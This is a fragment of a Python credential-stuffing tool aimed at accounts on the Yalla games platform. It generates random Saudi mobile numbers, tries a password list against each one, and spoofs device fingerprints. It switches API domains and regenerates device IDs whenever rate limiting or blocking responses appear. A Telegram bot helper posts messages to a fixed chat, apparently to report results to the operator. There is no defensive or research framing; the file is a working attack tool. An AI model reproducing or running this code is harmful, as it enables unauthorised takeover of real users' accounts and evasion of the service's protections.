HIT_SUMMARIES = []
MAX_HITS_SHOW = 6

def _tg_post(method, payload):
    url = 'https://api.telegram.org/bot' + TOKEN + '/' + method
    body = json.dumps(payload, ensure_ascii=False).encode('utf-8')
    headers = {'Content-Type': 'application/json; charset=utf-8'}
    for attempt in range(TG_RETRIES):
        try:
            r = requests.post(url, data=body, headers=headers, timeout=20, verify=False)
            try:
                j = r.json()
                if j.get('ok') is True:
                    return True, r.text
                else:
                    desc = j.get('description', 'unknown')
                    code = j.get('error_code', 0)
                    if code == 429:
                        time.sleep(5 * (attempt + 1))
                        continue
                    return False, str(code) + ': ' + desc
            except Exception:
                if r.status_code == 200:
                    return True, r.text
                return False, 'HTTP ' + str(r.status_code)
        except Exception as e:
            if attempt == TG_RETRIES - 1:
                return False, str(e)
            time.sleep(2)
    return False, 'unknown'

def fetch_user_info():
    try:
        ok, info = _tg_post('getChat', {'chat_id': CHAT})
        if ok:
            data = json.loads(info)
            if data.get('ok'):
                r = data['result']
                USER_INFO['first_name'] = r.get('first_name', '')
                USER_INFO['last_name'] = r.get('last_name', '')
                USER_INFO['username'] = r.get('username', '')
                USER_INFO['id'] = r.get('id', '')
    except Exception:
        pass

def startup_thread():
    try:
        fetch_user_info()
    except Exception:
        pass
    try:
        send_start()
    except Exception:
        pass

def send_start():
    full_name = (USER_INFO.get('first_name','') + ' ' + USER_INFO.get('last_name','')).strip()
    if not full_name: full_name = 'مستخدم'
    uname = USER_INFO.get('username','')
    uid = USER_INFO.get('id', CHAT)
    user_line = ('@' + uname) if uname else full_name
    
    ok, info = _tg_post('sendVideo', {'chat_id': CHAT, 'video': VIDEO_URL, 'caption': caption, 'parse_mode': 'HTML'})
    if not ok:
        _tg_post('sendMessage', {'chat_id': CHAT, 'text': caption, 'parse_mode': 'HTML'})

def send_message(text):
    if not TOKEN or not CHAT: return False
    ok, info = _tg_post('sendMessage', {'chat_id': CHAT, 'text': text, 'parse_mode': 'HTML', 'disable_web_page_preview': True})
    if ok:
        with lock:
            stats['sent'] += 1
        return True
    else:
        with lock:
            stats['failed'] += 1
        return False

def check(mob):
    global stop
    if stop: return
    m = mob.replace(' ','').replace('-','').replace('+','')
    if m.startswith('966'): m = m[3:]
    m = m.lstrip('0')
    d,a,s,n = gendev()
    for pw in PWS:
        if stop: return
        time.sleep(random.uniform(0.3,0.7))
        pl = {'mobile': m, 'areaCode': '966', 'password': md5up(pw), 'languageId': 2, 'nationalityId': '1', 'hostConfig': [{'bizType':5000,'countryCode':'IQ','hostUrl':'https://api-shumeng.yalla.games','type':2,'version':4},{'bizType':5001,'countryCode':'','hostUrl':'ws://firebreak.yalla.games','type':1,'version':1},{'bizType':1006,'countryCode':'IQ','hostUrl':'https://httpgateway.foodjkl.com,https://httpgateway.planecde.com,https://httpgateway.carrstuv.com','type':2,'version':20},{'bizType':1000,'countryCode':'IQ','hostUrl':'https://account.foodjkl.com,https://account.yalla.games,https://account.carrstuv.com','type':2,'version':19}], 'simCountry':'SA','version':'1.5.1.0','deviceId':d,'deviceName':'samsung Galaxy S23 Ultra','deviceType':2,'downloadChannelId':1,'shuMengId':s,'nonce':n,'plateType':0,'phoneModel':'SM-S918B','X-Phone-Country':'SA','X-Sim-Country':'SA','AndroidId':a,'IsSubpackages':0,'appType':0,'idfa':''}
        bb = json.dumps(pl, separators=(',',':'), ensure_ascii=False).encode()
        data = None
        for dom in DOMAINS:
            try:
                u = BASE.format(domain=dom)
                h, wire, hera = build(bb, u, d, a, s, n)
                r = requests.post(u, data=wire, headers=h, timeout=8, verify=False)
                if r.status_code in (429, 403):
                    time.sleep(1.5)
                    d,a,s,n = gendev()
                    continue
                if r.status_code != 200:
                    continue
                try:
                    rj = r.json()
                except:
                    continue
                data = dec(rj, hera)
                break
            except Exception:
                continue
        if not data:
            with lock:
                stats['bad_scans'] += 1
            continue
        st = data.get('status', -1)
        if st == 0:
            with lock:
                stats['good'] += 1
            return
        elif st == 151:
            d,a,s,n = gendev()
            continue
        elif st == 182:
            with lock:
                stats['notreg'] += 1
            return
        elif st == 1001:
            with lock:
                stats['bad_scans'] += 1
            return
        else:
            with lock:
                stats['bad_scans'] += 1
            continue
    with lock:
        stats['bad_scans'] += 1

def gen_mob():
    return random.choice(['050','053','055','056','054','058','059']) + ''.join(str(random.randint(0,9)) for _ in range(7))

